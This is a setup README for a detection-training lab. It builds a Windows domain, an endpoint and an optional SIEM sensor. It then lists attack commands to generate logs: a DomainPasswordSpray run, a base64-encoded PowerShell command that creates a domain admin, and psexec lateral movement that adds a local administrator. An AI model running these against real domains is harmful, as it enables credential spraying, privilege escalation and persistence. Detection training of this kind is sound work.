# Lab Setup
For more setup scripts and cool stuff, check out the fork of https://github.com/CyberConTraining/LogDetectionLab by @BoredHackerBlog

## Infrastructure
- Your infrastructure can really be hosted anywhere.
  - Locally via vmware, virtualbox, etc
  - In the cloud via Azure, GCP, AWS
  - Prod? (j/k)

- They should be in all the same network 

### 1. Windows Domain Controller
- Specs
  - supported OS version
  - [Logmira](https://github.com/Blumira/Logmira) (Either reduced or full verbosity is fine)

### 2. Windows Endpoint
- Joined to above domain
- Installs
  - Download and install [Wireshark](https://www.wireshark.org/)
  - Clone [Domain Password Spray from @dafthack](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)
  - Download both usernames.txt and passlist.txt from this github directory
  - Sysinternals Suite - https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite

### 3. Optional - Whatever you need for SIEM?
In my case you will see in the demos that I'm using a Blumira sensor. This is an Ubuntu box with a docker container that has a [Blumira](https://www.blumira.com) sensor installed on it. Because this isn't a SIEM training, it's difficult to go through a full lab setup of something like ELK or Splunk. 

We will cover in all lab demos finding event IDs in windows event viewer, but then also the concept of what they would look like in a SIEM as well. For in person trainings, everyone will be provided with logins to the Blumira platform during the class.

## Scripts/Commands

1. [Domain Password Spray from @dafthack](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)
   - Right-click, run powershell as admin
```
CD **directory where script has been saved**

Get-ExecutionPolicy

Set-ExecutionPolicy Unrestricted

Import-Module .\DomainPasswordSpray.ps1

Invoke-DomainPasswordSpray -UserList userlist.txt -Domain production.local -PasswordList passlist.txt
```
2. Creating a Domain Admin
- Create a DNDUsers OU in Active Directory Users & Computers on the DC
```
Get-ExecutionPolicy

Import-Module ActiveDirectory

$command = "New-ADUser -Name 'HP Lovecraft' -GivenName 'HP Lovecraft' -SamAccountName 'hplovecraft' -UserPrincipalName 'hplovecraft@miratime.org' -Path 'OU=TestUsers,DC=miratime,DC=org' -AccountPassword(Read-Host -AsSecureString 'Type Password for User')" 

$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)

$encodedCommand = [Convert]::ToBase64String($bytes) 

powershell.exe -EncodedCommand $encodedCommand

Enable-ADAccount -Identity "hplovecraft"

Add-ADGroupMember -Identity “Domain Admins” -Members hplovecraft
```
3. Data Exfil & Network Forensics


4. Lateral Movement
- Psexec add user to another host
```
CD into psexec directory
psexec.exe \\MagicRainbowPC.domain.local -u DNDUser -p passwordhere cmd
net user MyNewUser MyPassword#@$ /add
net localgroup administrators MyNewUser /add
```
